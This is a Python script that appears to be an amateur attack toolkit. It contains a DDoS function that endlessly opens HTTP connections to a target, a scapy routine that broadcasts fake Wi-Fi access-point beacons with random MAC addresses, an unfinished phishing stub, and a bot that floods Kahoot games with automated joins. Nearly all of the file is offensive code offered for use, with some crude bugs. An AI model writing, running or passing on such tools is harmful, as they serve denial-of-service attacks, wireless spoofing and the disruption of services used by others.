from twilio.rest import Client
import socket,time,smtplib,ssl,random,poplib,os,hashlib,string
from email.message import EmailMessage
from datetime import datetime
from webbot import Browser
from scapy.all import *

def CheckValue(type_word):
    try:
        int(type_word)
        return True
    except:
        return False



def DDOS(ip,pip):
  target = ip
  fake_ip = pip
  port = 80
  while True:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((target, port))
        s.sendto(("GET /" + target + " HTTP/1.1\r\n").encode('ascii'), (target, port))
        s.sendto(("Host: " + fake_ip + "\r\n\r\n").encode('ascii'), (target, port))
        s.close()
def Hotspot(name):
  
  try:
    iface = "wlan0mon"
    sender_mac = RandMAC()
    ssid = name
    dot11 = Dot11(type=0, subtype=8, addr1="ff:ff:ff:ff:ff:ff", addr2=sender_mac, addr3=sender_mac)
    beacon = Dot11Beacon()
    essid = Dot11Elt(ID="SSID", info=ssid, len=len(ssid))
    frame = RadioTap()/dot11/beacon/essid
    sendp(frame, inter=0.1, iface=iface, loop=1)
  except:
      print("Error: " + Exception)
      
def Phishing():
  print("Under development")
  
def BotCreator(ItCode):
  web = Browser()

  tab = 1
  add = 1
  
  
  web.go_to('https://kahoot.it')
  code = ItCode
  
  while True:
  
    text_areas = web.find_elements(xpath='//input')
    web.type(web.Key.TAB,into=text_areas[0].text)
    web.type(code)
    web.type(web.Key.ENTER,into=text_areas[0].text)
  
  
    text_areas2 = web.find_elements(xpath='//input')
    web.type(web.Key.TAB,into=text_areas2[0].text)
    web.type(code)
    web.type(web.Key.ENTER,into=text_areas2[0].text)
  
  
    time.sleep(2)
  
  
    text_areas3 = web.find_elements(xpath='//input')
    web.type(web.Key.TAB,into=text_areas3[0].text)
    web.type(code)
    web.type(web.Key.ENTER,into=text_areas3[0].text)
  
  
    adj1 = input("Name:")
    bot_username = random.choice(adj1) + "boi"
  
        
    text_areas4 = web.find_elements(xpath='//input')
    web.type(web.Key.TAB,into=text_areas4[0].text)
    web.type(bot_username)
    web.type(web.Key.ENTER,into=text_areas4[0].text)
  
  
    web.execute_script("window.open(' kahoot.it');")
    tab = tab + add
    web.switch_to_tab(tab)
  
  

        
    




        
    






        
